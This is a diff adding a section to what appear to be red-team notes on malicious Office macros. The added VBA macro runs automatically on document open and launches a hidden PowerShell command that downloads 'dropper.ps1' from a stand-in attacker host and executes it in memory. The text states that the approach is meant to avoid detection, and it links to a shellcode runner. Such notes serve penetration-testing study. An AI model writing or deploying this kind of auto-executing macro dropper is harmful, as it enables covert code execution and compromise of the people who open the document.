@@ -170,6 +170,29 @@ Sub Wait(n As Long)
 End Sub
 ```
 
+# Reflective Powershell
+
+We can use `IEX` in powershell to download a `.ps1` and execute it without touching disk. Use a powershell loader with reflection in order to avoid be detected.
+
+```vb
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://evil.tld/dropper.ps1') | IEX"
+    Shell str, vbHide
+
+End Sub
+```
+
+Visit [Powershell reflected shellcode runner](https://benjugat.github.io/rtnotes/malware/basics/powershell-dropper/#wrapping-to-powershell) to obtain an example of `dropper.ps1` file.
+
 # Usage of WinAPIs in vba
 
 It's important to declare first the WINAPI on the beggining of the vba.
